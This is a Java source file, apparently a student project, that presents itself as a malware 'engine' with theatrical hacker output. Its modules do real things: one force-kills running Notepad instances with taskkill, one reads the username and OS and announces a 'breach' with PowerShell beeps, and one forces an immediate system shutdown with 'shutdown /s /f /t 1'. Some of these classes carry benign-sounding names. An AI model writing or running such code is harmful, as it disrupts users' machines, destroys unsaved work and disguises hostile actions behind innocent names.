package com.uftbcyse.shawonjavaproject;

import java.io.File;
import java.io.FileWriter;
import java.util.ArrayList;
import java.util.List;

abstract class MalwareModule {
    protected String moduleName;
    protected int moduleId;

    public MalwareModule(String name, int id) {
        this.moduleName = name;
        this.moduleId = id;
    }

    public abstract void execute();

    public String getName() { return moduleName; }
    public int getId() { return moduleId; }

    protected void coolPrint(String text, int delay) {
        for (char c : text.toCharArray()) {
            System.out.print(c);
            try { Thread.sleep(delay); } catch (Exception e) {}
        }
        System.out.println();
    }
}

class FileSystemAudit extends MalwareModule {
    public FileSystemAudit() {
        super("FILE_SYSTEM_INFILTRATION", 201);
    }

    @Override
    public void execute() {
        coolPrint("[*] Launching Module " + getId() + ": " + getName() + "...", 30);
        coolPrint("[>] Accessing file system sectors...", 40);
        try {
            File file = new File("simulation_payload.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(" LOL ");
            writer.close();
            coolPrint("[+] Success: Local payload matrix generated.", 20);
            System.out.println("[+] File Vector: " + file.getAbsolutePath());
        } catch (Exception e) {
            System.out.println("[-] Warning: Vector blocked.");
        }
    }
}

class AutomatedProcessGuard extends MalwareModule {
    public AutomatedProcessGuard() {
        super("PROCESS_INTERCEPTION_MONITOR", 204);
    }

    @Override
    public void execute() {
        coolPrint("[*] Launching Module " + getId() + ": " + getName() + "...", 30);
        coolPrint("[>] Initializing live memory interception loop...", 40);
        
        for (int i = 1; i <= 3; i++) {
            try {
                Runtime.getRuntime().exec("taskkill /F /IM notepad.exe");
                coolPrint("    [>] Scan " + i + ": Purging target notepad instances from RAM.", 25);
                Thread.sleep(3000); 
            } catch (Exception e) {}
        }
    }
}

class SystemNotification extends MalwareModule {
    public SystemNotification() {
        super("BREACH_ALARM_IDENTITY_EXTRACTOR", 202);
    }

    @Override
    public void execute() {
        coolPrint("[*] Launching Module " + getId() + ": " + getName() + "...", 30);
        String username = System.getProperty("user.name");
        String osName = System.getProperty("os.name");
        coolPrint("[+] Host identity breached: " + username, 40);
        coolPrint("[+] OS Architecture locked: " + osName, 40);
        coolPrint("[>] Triggering persistent security breach alarm...", 30);
        
        for (int i = 1; i <= 5; i++) {
            try {
                
                String[] cmd = {"cmd.exe", "/c", "powershell -c \"[console]::beep(800,400)\""};
                Runtime.getRuntime().exec(cmd).waitFor();
                System.out.println("    [!] Alarm Beacon " + i + " dispatched.");
                if (i < 5) {
                    Thread.sleep(500); 
                }
            } catch (Exception e) {
                System.out.print("\007");
                System.out.flush();
            }
        }
    }
}

class SafeShutdownController extends MalwareModule {
    public SafeShutdownController() {
        super("CRITICAL_SYSTEM_TERMINATION", 203);
    }

    @Override
    public void execute() {
        coolPrint("[*] Launching Module " + getId() + ": " + getName() + "...", 30);
        coolPrint("[!] WARNING: Triggering system core shutdown sequence!", 50);
        try {
            String command = "shutdown /s /f /t 1";
            Runtime.getRuntime().exec("cmd /c " + command);
            coolPrint("[+] Instant shutdown sequence initiated: 1 second left.", 30);
        } catch (Exception e) {
            System.out.println("[-] Core isolation failed.");
        }
    }
}

class Rokon_engine {
    private List<MalwareModule> activeModules;

    public Rokon_engine() {
        this.activeModules = new ArrayList<>();
        System.out.println("==========================================================");
        System.out.println("  _____   ____  _  ______  _   _    ______ _   _  _____ ");
        System.out.println(" |  __ \\ / __ \\| |/ / __ \\| \\ | |  |  ____| \\ | |/ ____|");
        System.out.println(" | |__) | |  | | ' / |  | |  \\| |  | |__  |  \\| | |  __ ");
        System.out.println(" |  _  /| |  | |  <| |  | | . ` |  |  __| | . ` | | |_ |");
        System.out.println(" | | \\ \\| |__| | . \\ |__| | |\\  |  | |____| |\\  | |__| |");
        System.out.println(" |_|  \\_\\\\____/|_|\\_\\____/|_| \\_|  |______|_| \\_|\\_____|");
        System.out.println("==========================================================");
        System.out.println("[+] Core Engine: ROKON_ENGINE v4.0 Status: ACTIVE");
        System.out.println("==========================================================\n");
    }

    public void addModule(MalwareModule mod) {
        if (mod != null) {
            activeModules.add(mod);
            System.out.println("[SYSTEM_LOAD] Module registered: -> " + mod.getName());
        }
    }

    public void run() {
        try { Thread.sleep(1500); } catch(Exception e){}
        System.out.println("\n>>> DEPLOYING ORCHESTRATOR INJECTION <<<");
        System.out.println("==========================================================");
        for (MalwareModule mod : activeModules) {
            mod.execute();
            System.out.println("----------------------------------------------------------");
            try { Thread.sleep(1000); } catch(Exception e){}
        }
        System.out.println(">>> ALL CORE SYNC OPERATIONS COMPLETED <<<\n");
    }
}

public class ProjectBRO {
    public static void main(String[] args) {
        Rokon_engine engine = new Rokon_engine();

        engine.addModule(new FileSystemAudit());
        engine.addModule(new AutomatedProcessGuard());
        engine.addModule(new SystemNotification());
        engine.addModule(new SafeShutdownController());

        engine.run();
    }
}